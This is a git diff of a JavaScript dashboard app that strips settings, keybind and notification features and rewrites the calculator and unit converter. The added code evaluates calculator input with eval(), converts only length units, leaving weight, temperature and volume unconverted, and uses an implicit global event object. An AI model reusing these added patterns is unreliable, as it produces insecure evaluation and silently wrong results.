-      calcResetDisplay = false;
-  } else if (calcDisplayValue === '0' && value !== '.') {
-      calcDisplayValue = value;
+  if (display.textContent === '0') {
+    display.textContent = value;
   } else {
-      calcDisplayValue += value;
+    display.textContent += value;
   }
-  display.textContent = calcDisplayValue;
-  logActivity(`Calculator input: ${value}`, 'Calculator');
 }
 
 function clearCalc() {
   document.getElementById('calcDisplay').textContent = '0';
-  calcDisplayValue = '0';
-  calcOperator = null;
-  calcPrevValue = null;
-  calcResetDisplay = false;
-  logActivity('Calculator cleared', 'Calculator');
 }
 
 function deleteLast() {
   const display = document.getElementById('calcDisplay');
-  if (calcDisplayValue.length > 1) {
-    calcDisplayValue = calcDisplayValue.slice(0, -1);
+  if (display.textContent.length > 1) {
+    display.textContent = display.textContent.slice(0, -1);
   } else {
-    calcDisplayValue = '0';
+    display.textContent = '0';
   }
-  display.textContent = calcDisplayValue;
-  logActivity('Calculator backspace', 'Calculator');
 }
 
 function calculateResult() {
   const display = document.getElementById('calcDisplay');
-  if (calcPrevValue === null || calcOperator === null || calcResetDisplay) {
-      return; // Nothing to calculate
+  try {
+    const result = eval(display.textContent.replace('×', '*'));
+    display.textContent = result;
+    logActivity(`Calculation performed: ${display.textContent} = ${result}`);
+  } catch (error) {
+    display.textContent = 'Error';
   }
-
-  let result;
-  const prev = parseFloat(calcPrevValue);
-  const current = parseFloat(calcDisplayValue);
-  if (isNaN(prev) || isNaN(current)) {
-      display.textContent = 'Error';
-      calcDisplayValue = '0';
-      calcPrevValue = null;
-      calcOperator = null;
-      logActivity('Calculator error: Invalid numbers', 'Calculator');
-      return;
-  }
-
-  switch (calcOperator) {
-      case '+': result = prev + current; break;
-      case '-': result = prev - current; break;
-      case '*': result = prev * current; break;
-      case '/': result = prev / current; break;
-      default: return;
-  }
-  calcDisplayValue = result.toString();
-  display.textContent = calcDisplayValue;
-  calcPrevValue = null;
-  calcOperator = null;
-  calcResetDisplay = true;
-  logActivity(`Calculation performed: ${prev} ${calcOperator} ${current} = ${result}`, 'Calculator');
 }
 
 // Unit converter
-const conversionRates = {
-    length: {
-        m: { km: 0.001, cm: 100, mm: 1000, in: 39.3701, ft: 3.28084, m: 1 },
-        km: { m: 1000, cm: 100000, mm: 1000000, in: 39370.1, ft: 3280.84, km: 1 },
-        cm: { m: 0.01, km: 0.00001, mm: 10, in: 0.393701, ft: 0.0328084, cm: 1 },
-        mm: { m: 0.001, km: 0.000001, cm: 0.1, in: 0.0393701, ft: 0.00328084, mm: 1 },
-        in: { m: 0.0254, km: 0.0000254, cm: 2.54, mm: 25.4, ft: 0.0833333, in: 1 },
-        ft: { m: 0.3048, km: 0.0003048, cm: 30.48, mm: 304.8, in: 12, ft: 1 }
-    },
-    weight: {
-        kg: { g: 1000, lb: 2.20462, oz: 35.274, kg: 1 },
-        g: { kg: 0.001, lb: 0.00220462, oz: 0.035274, g: 1 },
-        lb: { kg: 0.453592, g: 453.592, oz: 16, lb: 1 },
-        oz: { kg: 0.0283495, g: 28.3495, lb: 0.0625, oz: 1 }
-    },
-    temperature: {
-        c: { f: (val) => (val * 9/5) + 32, k: (val) => val + 273.15, c: (val) => val },
-        f: { c: (val) => (val - 32) * 5/9, k: (val) => (val - 32) * 5/9 + 273.15, f: (val) => val },
-        k: { c: (val) => val - 273.15, f: (val) => (val - 273.15) * 9/5 + 32, k: (val) => val }
-    },
-    volume: {
-        l: { ml: 1000, gal: 0.264172, qt: 1.05669, l: 1 },
-        ml: { l: 0.001, gal: 0.000264172, qt: 0.00105669, ml: 1 },
-        gal: { l: 3.78541, ml: 3785.41, qt: 4, gal: 1 },
-        qt: { l: 0.946353, ml: 946.353, gal: 0.25, qt: 1 }
-    }
-};
-
 function updateConversionUnits() {
   const type = document.getElementById('conversionType').value;
-  const fromUnitSelect = document.getElementById('fromUnit');
-  const toUnitSelect = document.getElementById('toUnit');
+  const fromUnit = document.getElementById('fromUnit');
+  const toUnit = document.getElementById('toUnit');
   
-  fromUnitSelect.innerHTML = '';
-  toUnitSelect.innerHTML = '';
+  const units = {
+    length: [
+      { value: 'm', text: 'Meters' },
+      { value: 'km', text: 'Kilometers' },
+      { value: 'cm', text: 'Centimeters' },
+      { value: 'mm', text: 'Millimeters' },
+      { value: 'in', text: 'Inches' },
+      { value: 'ft', text: 'Feet' }
+    ],
+    weight: [
+      { value: 'kg', text: 'Kilograms' },
+      { value: 'g', text: 'Grams' },
+      { value: 'lb', text: 'Pounds' },
+      { value: 'oz', text: 'Ounces' }
+    ],
+    temperature: [
+      { value: 'c', text: 'Celsius' },
+      { value: 'f', text: 'Fahrenheit' },
+      { value: 'k', text: 'Kelvin' }
+    ],
+    volume: [
+      { value: 'l', text: 'Liters' },
+      { value: 'ml', text: 'Milliliters' },
+      { value: 'gal', text: 'Gallons' },
+      { value: 'qt', text: 'Quarts' }
+    ]
+  };
   
-  for (const unit in conversionRates[type]) {
-    const optionFrom = document.createElement('option');
-    optionFrom.value = unit;
-    optionFrom.textContent = unit.toUpperCase(); // Simple display
-    fromUnitSelect.appendChild(optionFrom);
-
-    const optionTo = document.createElement('option');
-    optionTo.value = unit;
-    optionTo.textContent = unit.toUpperCase();
-    toUnitSelect.appendChild(optionTo);
-  }
-  convertUnits(); // Perform conversion with new units
-  logActivity(`Unit converter type changed to ${type}`, 'Unit Converter');
+  fromUnit.innerHTML = '';
+  toUnit.innerHTML = '';
+  
+  units[type].forEach(unit => {
+    fromUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
+    toUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
+  });
 }
 
 function convertUnits() {
@@ -3018,29 +2258,21 @@ function convertUnits() {
   const fromUnit = document.getElementById('fromUnit').value;
   const toUnit = document.getElementById('toUnit').value;
   const type = document.getElementById('conversionType').value;
-  const toValueInput = document.getElementById('toValue');
   
-  if (isNaN(fromValue)) {
-    toValueInput.value = '';
-    return;
+  if (isNaN(fromValue)) return;
+  
+  let result = fromValue;
+  
+  // Length conversions (to meters first, then to target)
+  const lengthToMeters = {
+    'm': 1, 'km': 1000, 'cm': 0.01, 'mm': 0.001, 'in': 0.0254, 'ft': 0.3048
+  };
+  
+  if (type === 'length') {
+    result = fromValue * lengthToMeters[fromUnit] / lengthToMeters[toUnit];
   }
   
-  let result;
-  if (type === 'temperature') {
-      const convertFunc = conversionRates[type][fromUnit][toUnit];
-      if (typeof convertFunc === 'function') {
-          result = convertFunc(fromValue);
-      } else {
-          result = fromValue; // Same unit
-      }
-  } else {
-      const toBase = conversionRates[type][fromUnit][fromUnit]; // Value of fromUnit in its own base
-      const fromBase = conversionRates[type][fromUnit][toUnit]; // Value of fromUnit in toUnit
-      result = fromValue * conversionRates[type][fromUnit][toUnit];
-  }
-  
-  toValueInput.value = result.toFixed(4);
-  logActivity(`Converted ${fromValue} ${fromUnit} to ${result.toFixed(4)} ${toUnit}`, 'Unit Converter');
+  document.getElementById('toValue').value = result.toFixed(6);
 }
 
 // Media functions
@@ -3058,252 +2290,49 @@ function loadMedia() {
     
     if (videoId) {
       iframe.src = `https://www.youtube.com/embed/${videoId}`;
-      logActivity(`Media loaded: YouTube video ${videoId}`, 'Media');
-    } else {
-        showNotification('Invalid YouTube URL or ID.', 'error');
-        logActivity('Failed to load YouTube video: Invalid URL/ID', 'Media');
+      logActivity(`Media loaded: YouTube video ${videoId}`);
     }
-  } else {
-      showNotification('Only YouTube URLs are supported for now.', 'warning');
-      logActivity('Attempted to load non-YouTube media', 'Media');
   }
 }
 
 // Theme functions
 function toggleTheme() {
-  // This function is now handled by the settings modal's theme selector
-  // For quick access, we can toggle between a default light/dark
-  const currentTheme = document.documentElement.className;
-  if (currentTheme === 'theme-dark' || currentTheme === '') {
-      applyTheme('light');
-  } else {
-      applyTheme('dark');
-  }
-  logActivity('Theme toggled via quick button', 'Theme');
+  // Simple theme toggle - can be expanded
+  document.body.classList.toggle('light-theme');
+  logActivity('Theme toggled');
 }
 
-function applyTheme(themeName) {
+function applyTheme(theme) {
   const root = document.documentElement;
   
-  // Remove all existing theme classes
-  root.className = ''; 
-  root.classList.add(`theme-${themeName}`);
+  const themes = {
+    orange: { primary: '#ff4500', secondary: '#ff6b35' },
+    blue: { primary: '#0066cc', secondary: '#004499' },
+    green: { primary: '#00cc44', secondary: '#009933' },
+    red: { primary: '#cc0044', secondary: '#990033' },
+    purple: { primary: '#8800cc', secondary: '#6600aa' },
+    amber: { primary: '#ffaa00', secondary: '#ff8800' },
+    teal: { primary: '#00aaaa', secondary: '#008888' },
+    pink: { primary: '#ff0088', secondary: '#cc0066' }
+  };
   
-  // Update active state in theme selector
-  document.querySelectorAll('.theme-option').forEach(opt => {
-    if (opt.dataset.theme === themeName) {
-      opt.classList.add('active');
-    } else {
-      opt.classList.remove('active');
-    }
-  });
-  
-  saveSetting('theme', themeName);
-  logActivity(`Theme changed to: ${themeName}`, 'Theme');
+  if (themes[theme]) {
+    root.style.setProperty('--accent-color', themes[theme].primary);
+    root.style.setProperty('--accent-secondary', themes[theme].secondary);
+    
+    document.querySelectorAll('.theme-option').forEach(opt => opt.classList.remove('active'));
+    event.target.classList.add('active');
+    
+    logActivity(`Theme changed to: ${theme}`);
+  }
 }
 
-// Settings functions
-let settings = {};
-function loadSettings() {
-    const storedSettings = localStorage.getItem('dashboardSettings');
-    if (storedSettings) {
-        settings = JSON.parse(storedSettings);
-    } else {
-        // Default settings
-        settings = {
-            darkMode: true,
-            autoSaveNotes: true,
-            soundNotifications: false,
-            autoRefreshData: true,
-            compactView: false,
-            showAnimations: true,
-            highContrast: false,
-            autoBackup: true,
-            securityMode: true,
-            advancedLogging: false,
-            performanceMode: false,
-            developerMode: false,
-            experimentalFeatures: false,
-            dataCompression: true,
-            realtimeSync: false,
-            theme: 'orange' // Default theme
-        };
-    }
-    applySettings();
+function toggleSetting(toggle) {
+  toggle.classList.toggle('active');
+  stats.toggleSwitches++;
+  logActivity(`Setting toggled: ${toggle.previousElementSibling.textContent}`);
+  updateStats();
 }
-
-function applySettings() {
-    // Apply theme
-    document.documentElement.className = ''; // Clear existing
-    document.documentElement.classList.add(`theme-${settings.theme}`);
-    document.querySelectorAll('.theme-option').forEach(opt => {
-        if (opt.dataset.theme === settings.theme) {
-            opt.classList.add('active');
-        } else {
-            opt.classList.remove('active');
-        }
-    });
-
-    // Apply toggles
-    document.getElementById('darkModeToggle').classList.toggle('active', settings.darkMode);
-    document.getElementById('autoSaveNotesToggle').classList.toggle('active', settings.autoSaveNotes);
-    document.getElementById('soundNotificationsToggle').classList.toggle('active', settings.soundNotifications);
-    document.getElementById('autoRefreshDataToggle').classList.toggle('active', settings.autoRefreshData);
-    document.getElementById('compactViewToggle').classList.toggle('active', settings.compactView);
-    document.getElementById('showAnimationsToggle').classList.toggle('active', settings.showAnimations);
-    document.getElementById('highContrastToggle').classList.toggle('active', settings.highContrast);
-    document.getElementById('autoBackupToggle').classList.toggle('active', settings.autoBackup);
-    document.getElementById('securityModeToggle').classList.toggle('active', settings.securityMode);
-    document.getElementById('advancedLoggingToggle').classList.toggle('active', settings.advancedLogging);
-    document.getElementById('performanceModeToggle').classList.toggle('active', settings.performanceMode);
-    document.getElementById('developerModeToggle').classList.toggle('active', settings.developerMode);
-    document.getElementById('experimentalFeaturesToggle').classList.toggle('active', settings.experimentalFeatures);
-    document.getElementById('dataCompressionToggle').classList.toggle('active', settings.dataCompression);
-    document.getElementById('realtimeSyncToggle').classList.toggle('active', settings.realtimeSync);
-
-    // Apply other settings (e.g., font size, layout if implemented)
-    // For now, just log them
-    console.log("Settings applied:", settings);
-}
-
-function saveSetting(name, value) {
-    settings[name] = value;
-    localStorage.setItem('dashboardSettings', JSON.stringify(settings));
-    applySettings(); // Re-apply settings immediately
-}
-
-function toggleSetting(element, settingName) {
-    element.classList.toggle('active');
-    const newState = element.classList.contains('active');
-    saveSetting(settingName, newState);
-    stats.toggleSwitches++;
-    logActivity(`Setting "${settingName}" toggled to ${newState}`, 'Settings');
-    updateStats();
-}
-
-// Keybinds
-let keybinds = {};
-const defaultKeybinds = {
-    openSettings: 'Control+,',
-    quickSearch: 'Control+K',
-    newNote: 'Control+N',
-    saveAll: 'Control+S',
-    toggleTheme: 'Control+T',
-    openCalculator: 'Control+C',
-    openMedia: 'Control+M',
-    openTimer: 'Control+W',
-    openStats: 'Control+B',
-    downloadLogs: 'Control+L'
-};
-
-function loadKeybinds() {
-    const storedKeybinds = localStorage.getItem('dashboardKeybinds');
-    if (storedKeybinds) {
-        keybinds = JSON.parse(storedKeybinds);
-    } else {
-        keybinds = defaultKeybinds;
-    }
-    renderKeybinds();
-}
-
-function renderKeybinds() {
-    const keybindsList = document.getElementById('keybindsList');
-    if (!keybindsList) return; // Ensure element exists
-    keybindsList.innerHTML = ''; // Clear existing
-
-    for (const action in keybinds) {
-        const keybindItem = document.createElement('div');
-        keybindItem.className = 'keybind-item';
-        keybindItem.innerHTML = `
-            <span>${action.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</span>
-            <input type="text" class="keybind-input" value="${keybinds[action]}" readonly data-action="${action}">
-        `;
-        keybindsList.appendChild(keybindItem);
-    }
-
-    keybindsList.querySelectorAll('.keybind-input').forEach(input => {
-        input.addEventListener('focus', (e) => {
-            e.target.value = 'Press keys...';
-            e.target.dataset.recording = 'true';
-        });
-        input.addEventListener('blur', (e) => {
-            if (e.target.dataset.recording === 'true') {
-                e.target.value = keybinds[e.target.dataset.action]; // Revert if no key pressed
-            }
-            e.target.dataset.recording = 'false';
-        });
-        input.addEventListener('keydown', (e) => {
-            if (e.target.dataset.recording === 'true') {
-                e.preventDefault();
-                let key = e.key;
-                let modifiers = [];
-                if (e.ctrlKey) modifiers.push('Control');
-                if (e.shiftKey) modifiers.push('Shift');
-                if (e.altKey) modifiers.push('Alt');
-                if (e.metaKey) modifiers.push('Meta'); // Command key on Mac
-
-                // Filter out modifier keys themselves if they are the only key
-                if (['Control', 'Shift', 'Alt', 'Meta'].includes(key)) {
-                    key = ''; // Don't add modifier as the key if it's just the modifier
-                }
-
-                const newKeybind = [...modifiers, key].filter(Boolean).join('+');
-                e.target.value = newKeybind;
-                keybinds[e.target.dataset.action] = newKeybind;
-                localStorage.setItem('dashboardKeybinds', JSON.stringify(keybinds));
-                e.target.blur();
-                logActivity(`Keybind for "${e.target.dataset.action}" set to "${newKeybind}"`, 'Keybinds');
-            }
-        });
-    });
-}
-
-document.addEventListener('keydown', (e) => {
-    // Don't trigger keybinds if an input field is focused
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-        return;
-    }
-
-    let pressedKey = e.key;
-    let modifiers = [];
-    if (e.ctrlKey) modifiers.push('Control');
-    if (e.shiftKey) modifiers.push('Shift');
-    if (e.altKey) modifiers.push('Alt');
-    if (e.metaKey) modifiers.push('Meta');
-
-    // Special handling for modifier keys themselves
-    if (['Control', 'Shift', 'Alt', 'Meta'].includes(pressedKey)) {
-        pressedKey = ''; // Don't use modifier as the key if it's just the modifier
-    }
-
-    const currentKeybind = [...modifiers, pressedKey].filter(Boolean).join('+');
-
-    for (const action in keybinds) {
-        if (keybinds[action] === currentKeybind) {
-            e.preventDefault(); // Prevent default browser action
-            triggerKeybindAction(action);
-            logActivity(`Keybind triggered: "${action}" with "${currentKeybind}"`, 'Keybinds');
-            break;
-        }
-    }
-});
-
-function triggerKeybindAction(action) {
-    switch (action) {
-        case 'openSettings': togglePanel('settingsModal'); break;
-        case 'quickSearch': document.getElementById('searchBar').focus(); break;
-        case 'newNote': togglePanel('notesPanel'); break;
-        case 'saveAll': saveCanvas(); saveTextNotes(); showNotification('All notes saved!', 'success'); break;
-        case 'toggleTheme': toggleTheme(); break;
-        case 'openCalculator': togglePanel('calculatorPanel'); break;
-        case 'openMedia': togglePanel('mediaPanel'); break;
-        case 'openTimer': togglePanel('timerPanel'); break;
-        case 'openStats': showStats(); break;
-        case 'downloadLogs': downloadActivityLogs(); break;
-        default: console.log(`Keybind action "${action}" not implemented.`);
-    }
-}
-
 
 // Refresh functions
 function refreshFact() {
@@ -3312,16 +2341,11 @@ function refreshFact() {
     "A group of flamingos is called a 'flamboyance'.",
     "Bananas are berries, but strawberries aren't.",
     "The shortest war in history lasted only 38-45 minutes.",
-    "A single cloud can weigh more than a million pounds.",
-    "The Great Wall of China is not visible from space with the naked eye.",
-    "Octopuses have three hearts.",
-    "A 'jiffy' is an actual unit of time: 1/100th of a second.",
-    "The average person walks the equivalent of three times around the world in a lifetime.",
-    "There are more stars in the universe than grains of sand on all the beaches on Earth."
+    "A single cloud can weigh more than a million pounds."
   ];
   
   document.getElementById('randomFact').textContent = facts[Math.floor(Math.random() * facts.length)];
-  logActivity('Random fact refreshed', 'Content');
+  logActivity('Random fact refreshed');
 }
 
 function refreshQuote() {
@@ -3330,91 +2354,57 @@ function refreshQuote() {
     "\"Innovation distinguishes between a leader and a follower.\" - Steve Jobs",
     "\"Life is what happens to you while you're busy making other plans.\" - John Lennon",
     "\"The future belongs to those who believe in the beauty of their dreams.\" - Eleanor Roosevelt",
-    "\"It is during our darkest moments that we must focus to see the light.\" - Aristotle",
-    "\"The only limit to our realization of tomorrow will be our doubts of today.\" - Franklin D. Roosevelt",
-    "\"Strive not to be a success, but rather to be of value.\" - Albert Einstein",
-    "\"Believe you can and you're halfway there.\" - Theodore Roosevelt",
-    "\"The mind is everything. What you think you become.\" - Buddha",
-    "\"The best way to predict the future is to create it.\" - Peter Drucker"
+    "\"It is during our darkest moments that we must focus to see the light.\" - Aristotle"
   ];
   
   document.getElementById('dailyQuote').textContent = quotes[Math.floor(Math.random() * quotes.length)];
-  logActivity('Daily quote refreshed', 'Content');
+  logActivity('Daily quote refreshed');
 }
 
 function refreshWifi() {
-  // Simulate refreshing WiFi data
-  showNotification('WiFi data updated', 'info');
-  logActivity('WiFi information refreshed', 'Network');
+  logActivity('WiFi information refreshed');
+  showNotification('WiFi data updated');
 }
 
 function clearNotifications() {
   document.getElementById('notificationsList').innerHTML = '';
-  showNotification('Notifications cleared', 'info');
-  logActivity('Notifications cleared', 'Notifications');
+  logActivity('Notifications cleared');
 }
 
 function clearActivityLogs() {
   activityLogs = [];
   updateActivityLogDisplay();
-  showNotification('Activity logs cleared', 'info');
-  logActivity('Activity logs cleared', 'System');
+  logActivity('Activity logs cleared');
 }
 
-function showNotification(message, type = 'info') {
-  const notification = document.getElementById('welcomeNotification'); // Reusing this element
-  const icon = notification.querySelector('i');
-  const textSpan = notification.querySelector('span');
+function saveTextNotes() {
+  const notes = document.getElementById('textNotes').value;
+  localStorage.setItem('textNotes', notes);
+  showNotification('Notes saved successfully');
+  logActivity('Text notes saved');
+}
 
-  textSpan.textContent = message;
-  
-  // Reset classes
+function clearTextNotes() {
+  document.getElementById('textNotes').value = '';
+  logActivity('Text notes cleared');
+}
+
+function showNotification(message) {
+  const notification = document.createElement('div');
   notification.className = 'notification';
-  icon.className = '';
-
-  // Apply type-specific styling and icon
-  if (type === 'success') {
-      notification.style.background = 'linear-gradient(135deg, var(--success-color), #00cc33)';
-      icon.classList.add('fas', 'fa-check-circle');
-  } else if (type === 'warning') {
-      notification.style.background = 'linear-gradient(135deg, var(--warning-color), #e69900)';
-      icon.classList.add('fas', 'fa-exclamation-triangle');
-  } else if (type === 'error') {
-      notification.style.background = 'linear-gradient(135deg, var(--error-color), #cc0033)';
-      icon.classList.add('fas', 'fa-times-circle');
-  } else { // info
-      notification.style.background = 'linear-gradient(135deg, var(--accent-color), var(--accent-secondary))';
-      icon.classList.add('fas', 'fa-info-circle');
-  }
+  notification.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
+  document.body.appendChild(notification);
   
-  notification.classList.remove('hidden');
   setTimeout(() => {
-    notification.classList.add('hidden');
+    notification.remove();
   }, 3000);
 }
 
 function logout() {
   if (confirm('Are you sure you want to logout?')) {
-    logActivity('User logged out', 'Login');
     location.reload();
   }
 }
-
-function applyWifiLevelColors() {
-    document.querySelectorAll('#wifiGrid .wifi-item').forEach(item => {
-        item.classList.remove('wifi-high', 'wifi-medium', 'wifi-low'); // Clear existing
-        const levelText = item.dataset.level; // Use data-level attribute
-        if (levelText === 'High') {
-            item.classList.add('wifi-high');
-        } else if (levelText === 'Medium') {
-            item.classList.add('wifi-medium');
-        } else if (levelText === 'Low') {
-            item.classList.add('wifi-low');
-        }
-    });
-    logActivity('Applied WiFi level colors', 'UI');
-}
-
 
 // Event listeners
 document.addEventListener('DOMContentLoaded', () => {
@@ -3434,13 +2424,20 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
   
-  // Theme selector buttons
-  document.getElementById('themeSelector').addEventListener('click', (e) => {
-      const themeOption = e.target.closest('.theme-option');
-      if (themeOption) {
-          applyTheme(themeOption.dataset.theme);
-      }
+  // Color and thickness updates for drawing
+  document.getElementById('penColor').addEventListener('change', (e) => {
+    currentColor = e.target.value;
   });
+  
+  document.getElementById('penThickness').addEventListener('input', (e) => {
+    currentThickness = parseInt(e.target.value);
+  });
+  
+  // Load saved notes
+  const savedNotes = localStorage.getItem('textNotes');
+  if (savedNotes) {
+    document.getElementById('textNotes').value = savedNotes;
+  }
   
   // Track all button clicks for stats
   document.addEventListener('click', (e) => {
